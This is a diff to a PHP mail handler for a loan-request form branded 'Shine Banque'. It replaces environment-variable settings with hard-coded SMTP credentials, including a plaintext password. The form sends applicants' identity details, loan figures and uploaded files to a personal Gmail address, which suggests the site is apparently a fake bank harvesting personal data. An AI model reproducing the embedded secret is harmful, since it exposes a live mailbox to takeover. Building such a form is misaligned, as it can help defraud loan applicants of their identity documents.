@@ -21,22 +21,15 @@ if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
     sendResponse(false, 'Méthode non autorisée');
 }
 
-$requiredEnvVars = ['SMTP_HOST', 'SMTP_USERNAME', 'SMTP_PASSWORD', 'SMTP_PORT', 'ADMIN_EMAIL'];
-foreach ($requiredEnvVars as $var) {
-    if (!getenv($var)) {
-        sendResponse(false, "Configuration manquante: $var. Veuillez contacter l'administrateur.");
-    }
-}
-
-$smtpHost = getenv('SMTP_HOST');
-$smtpUsername = getenv('SMTP_USERNAME');
-$smtpPassword = getenv('SMTP_PASSWORD');
-$smtpPort = (int)getenv('SMTP_PORT');
-$adminEmail = getenv('ADMIN_EMAIL');
-$fromEmail = getenv('SMTP_FROM_EMAIL') ?: $smtpUsername;
-$fromName = getenv('SMTP_FROM_NAME') ?: 'Shine Banque';
-
-$smtpSecure = ($smtpPort == 465) ? PHPMailer::ENCRYPTION_SMTPS : PHPMailer::ENCRYPTION_STARTTLS;
+// Configuration SMTP directe (sans .env)
+$smtpHost = 'mail.craft-style.com';
+$smtpUsername = 'shinebanque@craft-style.com';
+$smtpPassword = '91rerdakonde';
+$smtpPort = 465;
+$smtpSecure = PHPMailer::ENCRYPTION_SMTPS; // SSL
+$adminEmail = 'shinebanque0@gmail.com';
+$fromEmail = 'shinebanque@craft-style.com';
+$fromName = 'Shine Banque';
 
 $requiredFields = [];
 $formData = [];
@@ -46,6 +39,7 @@ if (isset($_POST['lastName'])) $formData['Nom'] = $_POST['lastName'];
 if (isset($_POST['email'])) $formData['Email'] = $_POST['email'];
 if (isset($_POST['phone'])) $formData['Téléphone'] = $_POST['phone'];
 if (isset($_POST['birthdate'])) $formData['Date de naissance'] = $_POST['birthdate'];
+if (isset($_POST['loanType'])) $formData['Type de crédit'] = $_POST['loanType'];
 if (isset($_POST['amount'])) $formData['Montant'] = $_POST['amount'];
 if (isset($_POST['duration'])) $formData['Durée'] = $_POST['duration'];
 if (isset($_POST['monthlyPayment'])) $formData['Mensualité'] = $_POST['monthlyPayment'];
@@ -81,6 +75,7 @@ if (!empty($_FILES)) {
 }
 
 try {
+    // Email 1: Envoi à l'administrateur avec toutes les données
     $mail1 = new PHPMailer(true);
     $mail1->isSMTP();
     $mail1->Host = $smtpHost;
@@ -89,10 +84,10 @@ try {
     $mail1->Password = $smtpPassword;
     $mail1->SMTPSecure = $smtpSecure;
     $mail1->Port = $smtpPort;
-    $mail1->SMTPAutoTLS = true;
     $mail1->CharSet = 'UTF-8';
     
     $mail1->setFrom($fromEmail, $fromName);
+    $mail1->addReplyTo($fromEmail, $fromName);
     $mail1->addAddress($adminEmail);
     $mail1->Subject = 'Nouvelle demande depuis le site Shine Banque';
     
@@ -119,6 +114,7 @@ try {
         throw new Exception("Erreur lors de l'envoi à l'administrateur: " . $mail1->ErrorInfo);
     }
     
+    // Email 2: Confirmation au client
     $mail2 = new PHPMailer(true);
     $mail2->isSMTP();
     $mail2->Host = $smtpHost;
@@ -127,10 +123,10 @@ try {
     $mail2->Password = $smtpPassword;
     $mail2->SMTPSecure = $smtpSecure;
     $mail2->Port = $smtpPort;
-    $mail2->SMTPAutoTLS = true;
     $mail2->CharSet = 'UTF-8';
     
     $mail2->setFrom($fromEmail, $fromName);
+    $mail2->addReplyTo($fromEmail, $fromName);
     $mail2->addAddress($clientEmail);
     $mail2->Subject = 'Confirmation de votre demande - Shine Banque';
     
@@ -200,6 +196,7 @@ p {
 } catch (Exception $e) {
     sendResponse(false, "Erreur lors de l'envoi: " . $e->getMessage());
 } finally {
+    // Nettoyage des fichiers uploadés
     foreach ($uploadedFiles as $file) {
         if (file_exists($file['path'])) {
             unlink($file['path']);
